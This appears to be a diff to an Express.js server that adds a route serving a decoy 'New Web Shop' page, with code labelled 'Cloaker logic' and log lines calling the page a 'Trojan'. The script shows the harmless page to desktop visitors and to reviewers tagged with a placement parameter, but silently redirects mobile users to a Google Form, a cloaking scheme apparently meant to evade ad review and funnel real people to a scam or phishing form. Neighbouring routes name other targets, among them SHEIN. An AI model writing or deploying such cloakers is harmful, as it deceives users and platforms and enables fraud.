@@ -1893,6 +1893,39 @@ app.get('/whitefox/:slug', (req, res, next) => {
             console.log(`Served shein Trojan (${slug})`);
 });
 
+// DUDDUS SPLIT TARGET GOOGLE FORM
+app.get('/dudd/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://docs.google.com/forms/d/e/1FAIpQLSfNB9DEDsoFbAx-E8-GTl1aWdRn4iT_TQU3_8lqXSwkAqiErA/viewform?usp=sf_link`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}'s New Web Shop</title>
+        </head>
+        <body>
+            <h1>Greetings, and welcome to ${slug}'s New Web Shop!</h1>
+            <p>We hope you genuinely enjoy shopping here at ${slug} Web Shop and find everything you need.</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served Duddus Trojan (${slug})`);
+});
+
 // TEAM1 SHEIN SPARK - 15% SPLIT UTM TAG
 app.get('/team1/:slug', (req, res, next) => {
     const { slug } = req.params;
